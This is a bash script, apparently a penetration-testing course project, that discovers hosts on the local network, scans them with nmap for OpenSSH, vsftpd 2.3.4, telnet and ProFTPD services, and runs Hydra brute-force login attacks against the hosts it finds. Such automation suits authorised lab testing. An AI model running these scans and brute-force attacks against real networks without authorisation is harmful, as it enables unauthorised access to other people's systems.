#/bin/bash

#	This function updates and upgrades the current system to the latest version.
function updateupgrade ()
{
	
	echo -e "\n-------------------------  Update and Ugrade System  -------------------------"
	
	#	This command will get all the information on the latest version of packages that are available for the user's system.
	sudo apt-get -y update

	#	This command will download and install all the latest version of the required packages to upgrade the user's system to the latest version available.
	sudo apt-get -y upgrade
	
	echo -e "\n-------------------  Upgrade and Upgrade System Completed  -------------------"
}


#	This function download and installs all the tools required to run the script.
function installtools ()
{
	
	echo -e "\n--------------------------  Installation of Tools  ---------------------------"

	#	This command will install geany onto the system in the event there is a need for user to amend certain commands to meet their needs.
	sudo apt-get -y install geany
	
	#	This command will install nmap into the system.
	sudo apt-get -y install nmap
	
	#	This command will install hydra into the system.
	sudo apt-get -y install hydra
	
	echo -e "\n---------------------  Installation of Tools Completed  -----------------------"
	
}


#	This function looks for live host connecting to the lan network and automatically nmap the hosts.
function networkscan ()
{

	echo -e "\n--------------------  Scan Network for Vulnerable Hosts  ----------------------"	
	
	#	This command gets the network range of the current network.
	NetworkRange=$(ip r |grep kernel |awk '{print $1}')

	#	This command will print out the network range onto the terminal for user to view.
	echo "Network range: $NetworkRange"

	#	This command will scan the network range and capture the information of current live hosts connected to the network and save it into the file "Discovered.txt".
	sudo netdiscover -r "$NetworkRange" -PN > ~/Desktop/Vulner/"$todaydate"/Discovered.txt

	#	This command will read "Discovered.txt" and just takes out the IP address of the host connected to the network and save it into the file "ConnectedHost.txt".
	cat ~/Desktop/Vulner/"$todaydate"/Discovered.txt |grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" > ~/Desktop/Vulner/"$todaydate"/ConnectedHost.txt

	#	This command removes the file "Discovered.txt".
	rm ~/Desktop/Vulner/"$todaydate"/Discovered.txt
	
	echo -e "\n------------------  Host currently connected to the network  ------------------"
	
	#	This command prints out the IP address of the connected live hosts onto the terminal for user to view. 
	cat ~/Desktop/Vulner/"$todaydate"/ConnectedHost.txt

	#	This command execute nmap on the list of IP address (live hosts connected) and save the result into the file "VulnerabilityScanResults.txt".
	nmap -iL ~/Desktop/Vulner/"$todaydate"/ConnectedHost.txt -p- -sV -oG ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt
	
	#	This command opens up "VulnerabilityScanResults.txt" to look for the IP address that has SSH port open with OpenSSH 8.9p1 service version and save it into the file "OpenSSH8.9p1_Vulnerability.txt"
	cat ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt |grep open/tcp//ssh//OpenSSH\ 8.9p1 |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_Vulnerability.txt

	#	This command opens up "VulnerabilityScanResults.txt" to look for the IP address that has FTP port open with vsftpd 2.3.4 service version and save it into the file "vsftpd2.3.4_Vulnerability.txt"	
	cat ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt |grep open/tcp//ftp//vsftpd\ 2.3.4 |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/vsftpd2.3.4_Vulnerability.txt
	
	#	This command opens up "VulnerabilityScanResults.txt" to look for the IP address that has Telnet port with Linux telnetd service version open and save it into the file "FTP_Vulnerability.txt"	
	cat ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt |grep open/tcp//telnet//Linux\ telnetd |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/Telnet_Vulnerability.txt
	
	#	This command opens up "VulnerabilityScanResults.txt" to look for the IP address that has FTP port with ProFTPD service version open and save it into the file "proFTP_Vulnerability.txt"	
	cat ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt |grep open/tcp//ftp//ProFTPD |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/ProFTPD_Vulnerability.txt
	
		#	This command gets the time and date details of the start of nmap and save it in the variable "Scanstart"
		Scanstart=$(cat ~/Desktop/Vulner/"$todaydate"/VulnerabilityScanResults.txt |grep initiated |awk '{print $6" "$7" "$8" "$9" "$10}')
	
		#	These command creates a for loop to save the details of the IP address with OpenSSH 8.9p1 vulnerability and save it into the combine report "Scanningreport.txt"
		for sshvul in $(cat ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_Vulnerability.txt); do
		
		echo -e "$Scanstart: IP ADDRESS=$sshvul: VULNERABILITY=OpenSSH 8.9p1\n" >> ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt
		
		done

		#	These command creates a for loop to save the details of the IP address with vsftpd2.3.4 backdoor vulnerability and save it into the combine report "Scanningreport.txt"		
		for vsftpdvul in $(cat ~/Desktop/Vulner/"$todaydate"/vsftpd2.3.4_Vulnerability.txt); do
		
		echo -e "$Scanstart: IP ADDRESS=$vsftpdvul: VULNERABILITY=vsftpd 2.3.4 backdoor\n" >> ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt
		
		done

		#	These command creates a for loop to save the details of the IP address with telnetd vulnerability and save it into the combine report "Scanningreport.txt"		
		for telnetvul in $(cat ~/Desktop/Vulner/"$todaydate"/Telnet_Vulnerability.txt); do
		
		echo -e "$Scanstart: IP ADDRESS=$telnetvul: VULNERABILITY=Linux telnetd\n" >> ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt
		
		done
		
		#	These command creates a for loop to save the details of the IP address with ProFTPD vulnerability and save it into the combine report "Scanningreport.txt"		
		for ProFTPDvul in $(cat ~/Desktop/Vulner/"$todaydate"/ProFTPD_Vulnerability.txt); do
		
		echo -e "$Scanstart: IP ADDRESS=$ProFTPDvul: VULNERABILITY=ProFTPD\n" >> ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt
		
		done
	
	echo -e "\n--------------------------  Vulnerability Scan Report -------------------------\n"
	
	#	These 4 commands first display the combine report "Scanningreport.txt" on the terminal for user to view. Then delete away the unnecessary working files.
	cat ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt
	rm -f ~/Desktop/Vulner/"$todaydate"/vsftpd2.3.4_Vulnerability.txt
	rm -f ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_Vulnerability.txt
	rm -f ~/Desktop/Vulner/"$todaydate"/Telnet_Vulnerability.txt
	rm -f ~/Desktop/Vulner/"$todaydate"/ProFTPD_Vulnerability.txt
	
}


#	This command is for executing attacks on the scanned vulnerable hosts.
function Attacks ()
{

echo -e "\n------------------------  Bruteforce Vulnerable Hosts  ------------------------"

#	This command display the options available for user and request for their choice.
echo -e "(A) Specify User list file.
(B) Specify Password list file.
(C) Create new User list file.
(D) Create new Password List file.
(E) Execute available Vulerablility Attacks.
(F) Return to Main Menu."
read executions

		#	This command runs when the user choose (A)
		if [ $executions == a ] || [ $executions == A ]
		
			then
			
			#	This command checks if there are user files in the User List direcory.
			userfiles=$(ls ~/Desktop/Vulner/User\ list |wc -l)
			
			#	This command runs when there are no user files in the User List directory.
			if [ $userfiles == 0 ]
			
				then
			
				echo -e "\nThere is currently no user file available."
				
				Attacks
				
				else
			
				echo -e "\nCurrent User list available (Vulner/User list directory)"
				
				#	This command list out all the user files that is in the directory
				ls ~/Desktop/Vulner/User\ list
			
				#	This command request the user to select the user file that they want to use.
				echo -e "\nPlease provide the user list you want to use:" && read userlist
				
				#	This command shows the user which user file they selected.
				echo -e "\nSelected: '$userlist' as user list"
				
				Attacks
			
				
			fi
			
		#	This command runs when the user choose (B)	
		elif [ $executions == b ] || [ $executions == B ]
		
			then
			#	This command checks if there are password files in the Password List direcory.			
			pwfiles=$(ls ~/Desktop/Vulner/PW\ list |wc -l)
			
			#	This command runs when there are no password files in the Password List directory.
			if [ $pwfiles == 0 ]
			
				then
				
				echo -e "\nThere is currently no password file available."
				Attacks
				
				else
				
				echo -e "\nCurrent User list available (Vulner/PW list directory)"
				
				#	This command list out all the password files that is in the directory			
				ls ~/Desktop/Vulner/PW\ list

				#	This command request the user to select the password file that they want to use.			
				echo -e "\nPlease provide the password list filename: " && read pwlist

				#	This command shows the user which password file they selected.			
				echo -e "\nSelected: '$pwlist' as password list"
				
				Attacks
				
			fi
		#	This command runs when the user choose (C)	
		elif [ $executions == c ] || [ $executions == C ] 
		
			then
			
			#	This command runs the function to create a user list file
			createuserlist
			
			Attacks
			
		#	This command runs when the user choose (D)				
		elif [ $executions == d ] || [ $executions == D ]
		
			then
			
			#	This command runs the function to create a password list file
			createpwlist
			
			Attacks
			
		#	This command runs when the user choose (E)		
		elif [ $executions == e ] || [ $executions == E ]
		
			then
				echo -e "\nUser list selected: '$userlist'\nPassword list selected: '$pwlist'"
				
				#	This command runs if the user have not selected a user file.
				if [ -z "$userlist" ]
				
					then
					
					#	This command runs if the user have not selected a user and password file.
					if  [ -z "$pwlist" ]
					
						then
						echo 'No User list and Password list selected. Please choose or create one'
						
						Attacks
						
					else 
						#	This command runs if the user have not selected a user file but have already selected password file.		
						echo 'No User list selected. Please choose or create one'
						
						Attacks
						
					fi
				#	This command runs if the user have already selected a user file but not a password file.	
				elif  [ -z "$pwlist" ]
					
					then
					echo 'No Password list selected. Please choose or create one'
					
					Attacks
						
				else		
					
					#	These 3 commands runs all the attacks functions on the identified IP address.
					sortattack
					OpenSSH8.9p1_vul
					Telnet_vul
					vsftpd2.3.4_vul
					ProFTPD_vul	
					
					#	These 3 commands will remove all the unnessasary working files after the attack.
					rm -f ~/Desktop/Vulner/"$todaydate"/Vsftpd2.3.4_attack.txt
					rm -f ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_attack.txt
					rm -f ~/Desktop/Vulner/"$todaydate"/Telnet_attack.txt
					rm -f ~/Desktop/Vulner/"$todaydate"/ProFTPD_attack.txt

					
					Attacks
				fi 
		#	This command runs when the user choose (F)		
		elif [ $executions == f ] || [ $executions == F ]
			
			then
			
			userinterface
			
		else
		#	This command runs when the user did not choose any of the available choices.
			echo -e "\nYou did not enter a valid choice"
			
			Attacks
		fi
}


#	This function is for the creation of password list.
function createpwlist ()
{
	#	This command request for user to input a password list filename and save it into the variable "pwlistname"
	echo -e "\nNew password list filename:"
	read pwlistname
	
	echo -e "\nInput password one by one. Input 'END' to finish and save the list"
	
	function createpwloop ()
	{
		#	This command request users to input the password they want to put into the password list
		read newpw
	
		#	This command ends the password list creation process when user types in "END".
		if [ $newpw == END ]
	
			then
		
			echo -e "\nYou have successfully created a password list"
		
			else
			#	This command allows users to continue to add in password to the password list as long as the user did not enter "END".
			echo $newpw >> ~/Desktop/Vulner/PW\ list/$pwlistname
			
			createpwloop		
		
		fi
	}
	
	createpwloop
}


#	This function is for the creation of user list.
function createuserlist ()
{
	#	This command request for user to input a user list filename and save it into the variable "userlistname"
	echo -e "\nNew user list filename."
	read userlistname
	
	echo -e "\nInput the user one by one. Input 'END' to finish and save the list"
	
	function createuserloop ()
	{
		#	This command request users to input the user they want to put into the user list
		read newuser

		#	This command ends the user list creation process when user types in "END".
		if [ $newuser == END ]
	
			then
		
			echo -e "\nYou have successfully created a user list"
		
			else
			
			#	This command allows users to continue to add in user to the user list as long as the user did not enter "END".
			echo $newuser >> ~/Desktop/Vulner/User\ list/$userlistname
			
			createuserloop		
		
		fi
	}
	
	createuserloop
}


#	This function is to sort out the IP address to the different vulnerabilities.
function sortattack ()
{
	
	#	This command takes the details from "Scanningreport.txt" and sort them based on their IP addresses. If there are 2 vulnerabilities for any IP address, it will automatically remove 1 of it.
	cat ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt |sort |uniq -w 55 > ~/Desktop/Vulner/"$todaydate"/Attack.txt
	
	#~ cat ~/Desktop/Vulner/"$todaydate"/Scanningreport.txt > ~/Desktop/Vulner/"$todaydate"/Attack.txt
	
	#	This command will sort out the IP address used for the specific attack and save it in a file.
	cat ~/Desktop/Vulner/"$todaydate"/Attack.txt |grep vsftpd |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/Vsftpd2.3.4_attack.txt

	#	This command will sort out the IP address used for the specific attack and save it in a file.	
	cat ~/Desktop/Vulner/"$todaydate"/Attack.txt |grep OpenSSH |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_attack.txt

	#	This command will sort out the IP address used for the specific attack and save it in a file.	
	cat ~/Desktop/Vulner/"$todaydate"/Attack.txt |grep Linux\ telnetd |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/Telnet_attack.txt
	
	#	This command will sort out the IP address used for the specific attack and save it in a file.	
	cat ~/Desktop/Vulner/"$todaydate"/Attack.txt |grep ProFTPD |grep -oE "([0-9]{1,3}\.){3}[0-9]{1,3}" > ~/Desktop/Vulner/"$todaydate"/ProFTPD_attack.txt

	#	This command will remove the unnecessary working file.
	rm ~/Desktop/Vulner/"$todaydate"/Attack.txt 
	
}


#	This function will run the OpenSSH hydra attack.
function OpenSSH8.9p1_vul ()
{
	
	#	This for loop will continue to run for each individual IP address in the specific attack file.
	for IPadd in $(cat ~/Desktop/Vulner/"$todaydate"/OpenSSH8.9p1_attack.txt); do	
	
	#	This command gets the day, date and time for the start of the attack and save it in the variable "startdate"
	startdate=$(date)
	
	#	This command creates a specific folder for the individual IP address
	mkdir -p ~/Desktop/Vulner/"$todaydate"/$IPadd

	#	This command runs Hydra on the IP address and save it into a file.
	hydra -L ~/Desktop/Vulner/User\ list/$userlist -P ~/Desktop/Vulner/PW\ list/$pwlist $IPadd ssh -t4 -vV -o ~/Desktop/Vulner/"$todaydate"/$IPadd/OpenSSH8.9p1_Hydra_Attacks.txt

	#	This command gets the attack results and save it in the variable "hydraresult"
	hydraresult=$(cat ~/Desktop/Vulner/"$todaydate"/$IPadd/OpenSSH8.9p1_Hydra_Attacks.txt |grep host |sort |uniq)

	#	This command gets all the details and save it into the combine report log file.
	echo -e "$startdate: IP address=$IPadd: COMMAN=Hydra: SERVICE=OpenSSH 8.9p1: RESULT=$hydraresult\n" >> ~/Desktop/Vulner/OverallReportlog.txt
		
	done
}


#	This function will run the Telnet hydra attack.
function Telnet_vul ()
{

	#	This for loop will continue to run for each individual IP address in the specific attack file.
	for IPadd in $(cat ~/Desktop/Vulner/"$todaydate"/Telnet_attack.txt); do	
	
	#	This command gets the day, date and time for the start of the attack and save it in the variable "startdate"
	startdate=$(date)
	
	#	This command creates a specific folder for the individual IP address
	mkdir -p ~/Desktop/Vulner/"$todaydate"/$IPadd

	#	This command runs Hydra on the IP address and save it into a file.	
	hydra -L ~/Desktop/Vulner/User\ list/$userlist -P ~/Desktop/Vulner/PW\ list/$pwlist $IPadd telnet -vV -o ~/Desktop/Vulner/"$todaydate"/$IPadd/Telnet_Hydra_Attacks.txt

	#	This command gets the attack results and save it in the variable "hydraresult"	
	hydraresult=$(cat ~/Desktop/Vulner/"$todaydate"/$IPadd/Telnet_Hydra_Attacks.txt |grep host |sort |uniq)

	#	This command gets all the details and save it into the combine report log file.
	echo -e "$startdate: IP address=$IPadd: COMMAN=Hydra: SERVICE=Linux telnetd: RESULT=$hydraresult\n" >> ~/Desktop/Vulner/OverallReportlog.txt
	 
	done
}


#	This function will run the vsftpd2.3.4 hydra attack.
function vsftpd2.3.4_vul ()
{

	#	This for loop will continue to run for each individual IP address in the specific attack file.
	for IPadd in $(cat ~/Desktop/Vulner/"$todaydate"/vsftpd2.3.4_attack.txt); do	
	
	#	This command gets the day, date and time for the start of the attack and save it in the variable "startdate"
	startdate=$(date)
	
	#	This command creates a specific folder for the individual IP address
	mkdir -p ~/Desktop/Vulner/"$todaydate"/$IPadd

	#	This command runs Hydra on the IP address and save it into a file.	
	hydra -L ~/Desktop/Vulner/User\ list/$userlist -P ~/Desktop/Vulner/PW\ list/$pwlist $IPadd ftp -vV -o ~/Desktop/Vulner/"$todaydate"/$IPadd/vsftpd2.3.4_Hydra_Attacks.txt

	#	This command gets the attack results and save it in the variable "hydraresult"	
	hydraresult=$(cat ~/Desktop/Vulner/"$todaydate"/$IPadd/vsftpd2.3.4_Hydra_Attacks.txt |grep host |sort |uniq)

	#	This command gets all the details and save it into the combine report log file.
	echo -e "$startdate: IP address=$IPadd: COMMAN=Hydra: SERVICE=Linux telnetd: RESULT=$hydraresult\n" >> ~/Desktop/Vulner/OverallReportlog.txt
	 
	done
}


#	This function will run the ProFTPD hydra attack.
function ProFTPD_vul ()
{

	#	This for loop will continue to run for each individual IP address in the specific attack file.
	for IPadd in $(cat ~/Desktop/Vulner/"$todaydate"/ProFTPD_attack.txt); do	
	
	#	This command gets the day, date and time for the start of the attack and save it in the variable "startdate"
	startdate=$(date)
	
	#	This command creates a specific folder for the individual IP address
	mkdir -p ~/Desktop/Vulner/"$todaydate"/$IPadd

	#	This command runs Hydra on the IP address and save it into a file.	
	hydra -L ~/Desktop/Vulner/User\ list/$userlist -P ~/Desktop/Vulner/PW\ list/$pwlist $IPadd ftp -s 2121 -vV -o ~/Desktop/Vulner/"$todaydate"/$IPadd/ProFTPD_Hydra_Attacks.txt

	#	This command gets the attack results and save it in the variable "hydraresult"	
	hydraresult=$(cat ~/Desktop/Vulner/"$todaydate"/$IPadd/ProFTPD_Hydra_Attacks.txt |grep host |sort |uniq)

	#	This command gets all the details and save it into the combine report log file.
	echo -e "$startdate: IP address=$IPadd: COMMAN=Hydra: SERVICE=ProFTPD: RESULT=$hydraresult\n" >> ~/Desktop/Vulner/OverallReportlog.txt
	 
	done
}


#	This function is for user to view the overall log report.
function ViewReports ()
{
	
#	This command display the options available for user and request for their choice.
echo -e "\n(A) View Full Reportlog.
(B) View individual IP address log."
read viewingreport
	
	#	This command runs when the user choose (A)
	if [ $viewingreport == a ] || [ $viewingreport == A ]
	
	then
		#	This command display the whole report log.
		cat ~/Desktop/Vulner/OverallReportlog.txt
	
	else
		#	This command runs when the user did not choose (A) and request for user to input the IP Address that they want to view details of.
		echo -e "\nPlease enter the IP address that you want to check\n"
		
		read ReportIP

		#	This command will display logs on the specified IP address only.
		cat ~/Desktop/Vulner/OverallReportlog.txt |grep $ReportIP

	fi
}


		
#	This function is the user interface and for user to choose which section of the script do they want to run.
function userinterface ()
{
	
echo -e "\n--------------------------------  Main Menu  ----------------------------------"

#	This command display the options available for user and request for their choice.
echo -e "(A) Update and upgrade your system. 
(B) Install tools for the script.
(C) Scan Network for Vulnerable Hosts.
(D) Bruteforce Vulnerable Hosts.
(E) View Attacks Reports.
(F) Exit Script." 

read executions

#	This command is to navigate the script accordance to what was input by the user.
case $executions in

	# This command is when a user choose (A) and the script will run the update and upgrading of the system.
	a | A)
		updateupgrade
		userinterface
	;;

	# This command is when a user choose (B) and the script will run the installation of required tools.	
	b | B)
		installtools
		userinterface
	;;

	# This command is when a user choose (C) and the script will run the network scans to look for vulnerable hosts.	
	c | C)	
		networkscan
		userinterface
	;;

	# This command is when a user choose (D) and the script will run the attack functions on the vulnerable hosts.
	d | D)
		Attacks	
		userinterface
	;;
	
	# This command is when a user choose (E) and the script will show the report log.
	e | E)
		ViewReports
		userinterface
	;;
	
	# This command is when a user choose (F) and the script will exit.		
	f | F)
		exit
	;;
	
	# This command is when a user choose an option that is not in the list and it will redirect to the main menu.
	*)
		userinterface
	
esac
}

#	This command records the current day, time and date and store it into the variable "todaydate" for directory creation purpose.
todaydate=$(timedatectl |grep Universal |awk '{print $3" "$4}')

#	These 4 command starts once the script is running. It first creates the working directories required on the user desktop. It then shows the user interface where user first choose how they want to run the script.
mkdir -p ~/Desktop/Vulner
mkdir -p ~/Desktop/Vulner/User\ list
mkdir -p ~/Desktop/Vulner/PW\ list
mkdir -p ~/Desktop/Vulner/"$todaydate"

userinterface
